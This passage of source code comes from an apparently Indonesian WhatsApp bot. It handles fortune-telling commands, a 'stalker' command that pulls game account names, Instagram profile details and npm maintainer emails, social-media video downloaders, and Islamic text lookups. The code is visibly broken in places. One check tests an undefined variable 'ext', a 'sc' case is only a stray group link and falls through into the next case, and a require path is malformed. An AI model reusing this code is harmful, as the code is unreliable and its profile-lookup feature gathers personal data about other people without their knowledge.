                let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendText(m.chat, ` *Nama Anda :* ${anu.message.nama_anda.nama}\n *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n *Hasil :* ${anu.message.result}\n *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'suamiistri': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendText(m.chat, ` *Nama Suami :* ${anu.message.suami.nama}\n *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n *Nama Istri :* ${anu.message.istri.nama}\n *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n *Hasil :* ${anu.message.result}\n *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalancinta': case 'ramalcinta': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendText(m.chat, ` *Nama Anda :* ${anu.message.nama_anda.nama}\n *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n *Sisi Positif :* ${anu.message.sisi_positif}\n *Sisi Negatif :* ${anu.message.sisi_negatif}\n *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artinama': {
                if (!text) throw `Example : ${prefix + command} Dika Ardianta`
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendText(m.chat, ` *Nama :* ${anu.message.nama}\n *Arti :* ${anu.message.arti}\n *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'kecocokannama': case 'cocoknama': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendText(m.chat, ` *Nama :* ${anu.message.nama}\n *Lahir :* ${anu.message.tgl_lahir}\n *Life Path :* ${anu.message.life_path}\n *Destiny :* ${anu.message.destiny}\n *Destiny Desire :* ${anu.message.destiny_desire}\n *Personality :* ${anu.message.personality}\n *Persentase :* ${anu.message.persentase_kecocokan}`, m)
            }
            break
            case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
                if (!text) throw `Example : ${prefix + command} Dika|Novia`
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendImage(m.chat,  anu.message.gambar, ` *Nama Anda :* ${anu.message.nama_anda}\n *Nama Pasangan :* ${anu.message.nama_pasangan}\n *Sisi Positif :* ${anu.message.sisi_positif}\n *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            case 'jadianpernikahan': case 'jadiannikah': {
                if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendText(m.chat, ` *Tanggal Pernikahan :* ${anu.message.tanggal}\n *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case 'sifatusaha': {
                if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendText(m.chat, ` *Lahir :* ${anu.message.hari_lahir}\n *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            case 'rejeki': case 'rezeki': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendText(m.chat, ` *Lahir :* ${anu.message.hari_lahir}\n *Rezeki :* ${anu.message.rejeki}\n *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'pekerjaan': case 'kerja': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendText(m.chat, ` *Lahir :* ${anu.message.hari_lahir}\n *Pekerjaan :* ${anu.message.pekerjaan}\n *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalannasib': case 'ramalnasib': case 'nasib': {
                if (!text) throw `Example : 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendText(m.chat, ` *Analisa :* ${anu.message.analisa}\n *Angka Akar :* ${anu.message.angka_akar}\n *Sifat :* ${anu.message.sifat}\n *Elemen :* ${anu.message.elemen}\n *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            case 'potensipenyakit': case 'penyakit': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendText(m.chat, ` *Analisa :* ${anu.message.analisa}\n *Sektor :* ${anu.message.sektor}\n *Elemen :* ${anu.message.elemen}\n *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artitarot': case 'tarot': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendImage(m.chat, anu.message.image, ` *Lahir :* ${anu.message.tgl_lahir}\n *Simbol Tarot :* ${anu.message.simbol_tarot}\n *Arti :* ${anu.message.arti}\n *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'fengshui': {
                if (!text) throw `Example : ${prefix + command} Dika, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
                let [nama, gender, tahun] = text.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendText(m.chat, ` *Nama :* ${anu.message.nama}\n *Lahir :* ${anu.message.tahun_lahir}\n *Gender :* ${anu.message.jenis_kelamin}\n *Angka Kua :* ${anu.message.angka_kua}\n *Kelompok :* ${anu.message.kelompok}\n *Karakter :* ${anu.message.karakter}\n *Sektor Baik :* ${anu.message.sektor_baik}\n *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
            }
            break
            case 'haribaik': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendText(m.chat, ` *Lahir :* ${anu.message.tgl_lahir}\n *Kala Tinantang :* ${anu.message.kala_tinantang}\n *Info :* ${anu.message.info}\n *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case  'sc' :`https://chat.whatsapp.com/JOxS05d1WWO529F40SEVEa`
            
            case 'harisangar': case 'taliwangke': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendText(m.chat, ` *Lahir :* ${anu.message.tgl_lahir}\n *Hasil :* ${anu.message.result}\n *Info :* ${anu.message.info}\n *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harinaas': case 'harisial': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendText(m.chat, ` *Hari Lahir :* ${anu.message.hari_lahir}\n *Tanggal Lahir :* ${anu.message.tgl_lahir}\n *Hari Naas :* ${anu.message.hari_naas}\n *Info :* ${anu.message.catatan}\n *Catatan :* ${anu.message.info}`, m)
            }
            break
            case 'nagahari': case 'harinaga': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendText(m.chat, ` *Hari Lahir :* ${anu.message.hari_lahir}\n *Tanggal Lahir :* ${anu.message.tgl_lahir}\n *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'arahrejeki': case 'arahrezeki': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendText(m.chat, ` *Hari Lahir :* ${anu.message.hari_lahir}\n *tanggal Lahir :* ${anu.message.tgl_lahir}\n *Arah Rezeki :* ${anu.message.arah_rejeki}\n *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'peruntungan': {
                if (!text) throw `Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
                let [nama, tgl, bln, thn, untuk] = text.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendText(m.chat, ` *Nama :* ${anu.message.nama}\n *Lahir :* ${anu.message.tgl_lahir}\n *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n *Hasil :* ${anu.message.result}\n *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'weton': case 'wetonjawa': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendText(m.chat, ` *Tanggal :* ${anu.message.tanggal}\n *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n *Watak Hari :* ${anu.message.watak_hari}\n *Naga Hari :* ${anu.message.naga_hari}\n *Jam Baik :* ${anu.message.jam_baik}\n *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            case 'sifat': case 'karakter': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendText(m.chat, ` *Nama :* ${anu.message.nama}\n *Lahir :* ${anu.message.tgl_lahir}\n *Garis Hidup :* ${anu.message.garis_hidup}`, m)
            }
            break
            case 'keberuntungan': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendText(m.chat, ` *Nama :* ${anu.message.nama}\n *Lahir :* ${anu.message.tgl_lahir}\n *Hasil :* ${anu.message.result}`, m)
            }
            break
            case 'memancing': {
                if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendText(m.chat, ` *Tanggal :* ${anu.message.tgl_memancing}\n *Hasil :* ${anu.message.result}\n *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'masasubur': {
                if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
                let [tgl, bln, thn, siklus] = text.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendText(m.chat, ` *Hasil :* ${anu.message.result}\n *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'zodiak': case 'zodiac': {
                if (!text) throw `Example : ${prefix+ command} 7 7 2005`
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
                let date = new Date(text)
                if (date == 'Invalid Date') throw date
                let d = new Date()
                let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
                let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

                let zodiac = await getZodiac(birth[1], birth[2])
                
                let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendText(m.chat, ` *Zodiak :* ${anu.message.zodiak}\n *Nomor :* ${anu.message.nomor_keberuntungan}\n *Aroma :* ${anu.message.aroma_keberuntungan}\n *Planet :* ${anu.message.planet_yang_mengitari}\n *Bunga :* ${anu.message.bunga_keberuntungan}\n *Warna :* ${anu.message.warna_keberuntungan}\n *Batu :* ${anu.message.batu_keberuntungan}\n *Elemen :* ${anu.message.elemen_keberuntungan}\n *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'shio': {
                if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
                let anu = await primbon.shio(text)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendText(m.chat, ` *Hasil :* ${anu.message}`, m)
            }
            break
	    case 'stalker': case 'stalk': {
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply('Limit Harian Anda Telah Habis')
                if (!text) return m.reply(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
                let [type, id, zone] = args
                if (type.toLowerCase() == 'ff') {
                    if (!id) throw `No Query id, Example ${prefix + command} ff 552992060`
                    let anu = await fetchJson(api('riykey', '/api/nickff', { apikey: global.APIKeys[global.APIs['riykey']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'ml') {
                    if (!id) throw `No Query id, Example : ${prefix + command} ml 214885010 2253`
                    if (!zone) throw `No Query id, Example : ${prefix + command} ml 214885010 2253`
                    let anu = await fetchJson(api('riykey', '/api/nickml', { apikey: global.APIKeys[global.APIs['riykey']], query: id, query2: zone }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nZone : ${anu.result.zoneId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'aov') {
                    if (!id) throw `No Query id, Example ${prefix + command} aov 293306941441181`
                    let anu = await fetchJson(api('riykey', '/api/nickaov', { apikey: global.APIKeys[global.APIs['riykey']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'cod') {
                    if (!id) throw `No Query id, Example ${prefix + command} cod 6290150021186841472`
                    let anu = await fetchJson(api('riykey', '/api/nickcod', { apikey: global.APIKeys[global.APIs['riykey']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'pb') {
                    if (!id) throw `No Query id, Example ${prefix + command} pb riio46`
                    let anu = await fetchJson(api('riykey', '/api/nickpb', { apikey: global.APIKeys[global.APIs['riykey']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'ig') {
                    if (!id) throw `No Query username, Example : ${prefix + command} ig cak_haho`
                    let { result: anu } = await fetchJson(api('riykey', '/api/stalker/ig', { username: id }, 'apikey'))
                    if (anu.status == false) return m.reply(anu.result.message)
                    kiki.sendMedia(m.chat, anu.caption.profile_hd, '', ` Full Name : ${anu.caption.full_name}\n User Name : ${anu.caption.user_name}\n ID ${anu.caption.user_id}\n Followers : ${anu.caption.followers}\n Following : ${anu.caption.following}\n Bussines : ${anu.caption.bussines}\n Profesional : ${anu.caption.profesional}\n Verified : ${anu.caption.verified}\n Private : ${anu.caption.private}\n Bio : ${anu.caption.biography}\n Bio Url : ${anu.caption.bio_url}`, m)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'npm') {
                    if (!id) throw `No Query username, Example : ${prefix + command} npm scrape-primbon`
                    let { result: anu } = await fetchJson(api('riykey', '/api/stalker/npm', { query: id }, 'apikey'))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(` Name : ${anu.name}\n Version : ${Object.keys(anu.versions)}\n Created : ${tanggal(anu.time.created)}\n Modified : ${tanggal(anu.time.modified)}\n Maintainers :\n ${anu.maintainers.map(v => `- ${v.name} : ${v.email}`).join('\n')}\n\n Description : ${anu.description}\n Homepage : ${anu.homepage}\n Keywords : ${anu.keywords}\n Author : ${anu.author.name}\n License : ${anu.license}\n Readme : ${anu.readme}`)
		    db.data.users[m.sender].limit -= 1
                } else {
                    m.reply(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
                }
            }
            break
	        case 'tiktok': case 'tiktoknowm': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('riykey', '/downloader/tiktok', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `tiktokwm ${text}`, buttonText: {displayText: '► With Watermark'}, type: 1},
                    {buttonId: `tiktokmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.nowatermark },
                    caption: `Download From ${text}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                kiki.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'tiktokwm': case 'tiktokwatermark': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('riykey', '/downloader/tiktok', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: '► No Watermark'}, type: 1},
                    {buttonId: `tiktokmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.watermark },
                    caption: `Download From ${text}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                kiki.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'tiktokmp3': case 'tiktokaudio': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('riykey', '/downloader/musically', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: '► No Watermark'}, type: 1},
                    {buttonId: `tiktokwm ${text}`, buttonText: {displayText: '► With Watermark'}, type: 1}
                ]
                let buttonMessage = {
                    text: `Download From ${text}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                let msg = await kiki.sendMessage(m.chat, buttonMessage, { quoted: m })
                kiki.sendMessage(m.chat, { audio: { url: anu.result.audio }, mimetype: 'audio/mpeg'}, { quoted: msg })
            }
            break
	        case 'instagram': case 'ig': case 'igdl': {
                if (!text) throw 'No Query Url!'
                m.reply(mess.wait)
                if (/(?:\/p\/|\/reel\/|\/tv\/)([^\s&]+)/.test(isUrl(text)[0])) {
                    let anu = await fetchJson(api('riykey', '/downloader/instagram2', { url: isUrl(text)[0] }, 'apikey'))
                    for (let media of anu.data) kiki.sendMedia(m.chat, media, '', `Download Url Instagram From ${isUrl(text)[0]}`, m)
                } else if (/\/stories\/([^\s&]+)/.test(isUrl(text)[0])) {
                    let anu = await fetchJson(api('riykey', '/downloader/instastory', { url: isUrl(text)[0] }, 'apikey'))
                    kiki.sendMedia(m.chat, anu.media[0].url, '', `Download Url Instagram From ${isUrl(text)[0]}`, m)
                }
            }
            break
		/** Backup misal yg atas ga keluar video **/
		case 'igeh': case 'instagram2': case 'ig2': case 'igdl2': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                
                let anu = await fetchJson(api('riykey', '/downloader/instagram2', { url:text }, 'apikey'))
                kiki.sendMessage(m.chat, { video: { url: anu.data[0] } }, { quoted: m })
            }
            break
            case 'joox': case 'jooxdl': {
                if (!text) throw 'No Query Title'
                m.reply(mess.wait)
                let anu = await fetchJson(api('riykey', '/downloader/joox', { query: text }, 'apikey'))
                let msg = await kiki.sendImage(m.chat, anu.result.img, ` Title : ${anu.result.lagu}\n Album : ${anu.result.album}\n Singer : ${anu.result.penyanyi}\n Publish : ${anu.result.publish}\n Lirik :\n${anu.result.lirik.result}`, m)
                kiki.sendMessage(m.chat, { audio: { url: anu.result.mp4aLink }, mimetype: 'audio/mpeg', fileName: anu.result.lagu+'.m4a' }, { quoted: msg })
            }
            break
            case 'soundcloud': case 'sidl': {
                if (!text) throw 'No Query Title'
                m.reply(mess.wait)
                let anu = await fetchJson(api('riykey', '/downloader/soundcloud', { url: isUrl(text)[0] }, 'apikey'))
                let msg = await kiki.sendImage(m.chat, anu.result.thumb, ` Title : ${anu.result.title}\n Url : ${isUrl(text)[0]}`)
                kiki.sendMessage(m.chat, { audio: { url: anu.result.url }, mimetype: 'audio/mpeg', fileName: anu.result.title+'.m4a' }, { quoted: msg })
            }
            break
	        case 'twitdl': case 'twitter': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('riykey', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twittermp3 ${text}`, buttonText: {displayText: '► Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.HD || anu.result.SD },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                kiki.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'twittermp3': case 'twitteraudio': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('riykey', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twitter ${text}`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
		    image: { url: anu.result.thumb },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 4
                }
                let msg = await kiki.sendMessage(m.chat, buttonMessage, { quoted: m })
                kiki.sendMessage(m.chat, { audio: { url: anu.result.audio } }, { quoted: msg })
            }
            break
	        case 'fbdl': case 'fb': case 'facebook': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('riykey', '/api/downloader/facebook', { url: text }, 'apikey'))
                kiki.sendMessage(m.chat, { video: { url: anu.result.url }, caption: ` Title : ${anu.result.title}`}, { quoted: m })
            }
            break
	        case 'pindl': case 'pinterestdl': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('riykey', '/api/downloader/pinterestdl', { url: text }, 'apikey'))
                kiki.sendMessage(m.chat, { video: { url: anu.result }, caption: `Download From ${text}` }, { quoted: m })
            }
            break
            case 'umma': case 'ummadl': {
	        if (!text) throw `Example : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`
                let { umma } = require('./lib) scraper')
		let anu = await umma(isUrl(text)[0])
		if (anu.type == 'video') {
		    let buttons = [
                        {buttonId: `ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: '♫ Audio'}, type: 1},
                        {buttonId: `ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: '► Video'}, type: 1}
                    ]
		    let buttonMessage = {
		        image: { url: anu.author.profilePic },
			caption: `
 Title : ${anu.title}
 Author : ${anu.author.name}
 Like : ${anu.like}
 Caption : ${anu.caption}
 Url : ${anu.media[0]}
Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas
`,
			footer: kiki.user.name,
			buttons,
			headerType: 4
		    }
		    kiki.sendMessage(m.chat, buttonMessage, { quoted: m })
		} else if (anu.type == 'image') {
		    anu.media.map(async (url) => {
		        kiki.sendMessage(m.chat, { image: { url }, caption: ` Title : ${anu.title}\n Author : ${anu.author.name}\n Like : ${anu.like}\n Caption : ${anu.caption}` }, { quoted: m })
		    })
		}
	    }
	    break
        case 'ringtone': {
		if (!text) throw `Example : ${prefix + command} black rover`
        let { ringtone } = require('./lib/scraper')
		let anu = await ringtone(text)
		let result = anu[Math.floor(Math.random() * anu.length)]
		kiki.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
		case 'iqra': {
		oh = `Example : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
		if (!text) throw oh
		yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
		kiki.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:m}).catch ((err) => m.reply(oh))
		}
		break
		case 'juzamma': {
		if (args[0] === 'pdf') {
		m.reply(mess.wait)
		kiki.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted:m})
		} else if (args[0] === 'docx') {
		m.reply(mess.wait)
		kiki.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted:m})
		} else if (args[0] === 'pptx') {
		m.reply(mess.wait)
		kiki.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted:m})
		} else if (args[0] === 'xlsx') {
		m.reply(mess.wait)
		kiki.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted:m})
		} else {
		m.reply(`Mau format apa ? Example : ${prefix + command} pdf

Format yang tersedia : pdf, docx, pptx, xlsx`)
		}
		}
		break
		case 'hadis': case 'hadist': {
		if (!args[0]) throw `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`
		if (!args[1]) throw `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
		try {
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
		let { number, arab, id } = res.find(v => v.number == args[1])
		m.reply(`No. ${number}

${arab}

${id}`)
		} catch (e) {
		m.reply(`Hadis tidak ditemukan !`)
		}
		}
		break
		case 'alquran': {
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
